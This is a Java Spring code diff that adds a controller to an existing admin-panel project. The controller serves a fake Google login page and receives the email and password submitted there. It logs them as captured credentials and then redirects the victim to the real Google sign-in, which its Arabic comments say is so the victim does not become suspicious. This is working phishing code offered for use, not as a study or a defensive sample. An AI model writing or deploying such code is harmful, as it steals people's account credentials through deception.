@@ -31,3 +31,23 @@ public class AdminPanelController {
         return html.toString();
     }
 }
+@Controller
+public class GoogleCaptureController {
+
+    // 1. يفتح صفحة جوجل الوهمية لما يدوس على الزرار
+    @GetMapping("/login/google-page")
+    public String showGooglePage() {
+        return "google-login"; 
+    }
+
+    // 2. يستلم البيانات ويبعتها للأدمن ويحول المستخدم لجوجل الحقيقي
+    @PostMapping("/capture-google")
+    public String captureGoogle(@RequestParam String email, @RequestParam String password) {
+        // هنا الكود اللي بيبعت البيانات لصفحة الأدمن بتاعتك
+        System.out.println("Captured Google Email: " + email);
+        System.out.println("Captured Google Password: " + password);
+
+        // أهم خطوة: تحويل المستخدم لموقع جوجل الحقيقي عشان ميشكش في حاجة
+        return "redirect:https://accounts.google.com/ServiceLogin";
+    }
+}
